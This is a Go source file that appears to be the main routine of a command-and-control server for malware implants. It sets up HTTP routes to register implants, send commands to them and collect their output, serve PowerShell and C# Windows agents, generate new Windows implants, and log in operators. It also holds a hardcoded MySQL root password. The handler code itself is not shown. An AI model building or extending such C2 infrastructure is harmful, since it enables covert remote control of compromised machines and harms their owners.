package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"

	_ "github.com/go-sql-driver/mysql"
)

var db *sql.DB

func main() {
	var err error
	db, err = sql.Open("mysql", "root:lol.exe1@tcp(127.0.0.1:3306)/aef")
	if err != nil {
		panic(err)
	}

	var socket = ":8081"
	http.HandleFunc("/registerNewImplant", registerNewImplant)
	http.HandleFunc("/fetchCommand", fetchCommand)
	http.HandleFunc("/fetchOutput", fetchOutput)
	http.HandleFunc("/getClients", getClients)
	http.HandleFunc("/agents/windows/powershell", powerShellImplant)
	http.HandleFunc("/agents/windows/cs", windowsImplant)
	http.HandleFunc("/generate/windows/implant", generateImplant)
	http.HandleFunc("/getStoredOutput", getStoredOutput)
	http.HandleFunc("/operators/register", registerOperatorHandler)
	http.HandleFunc("/operators/login", loginOperatorHandler)

	fmt.Println("Listening on: " + socket)

	err = http.ListenAndServe(socket, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
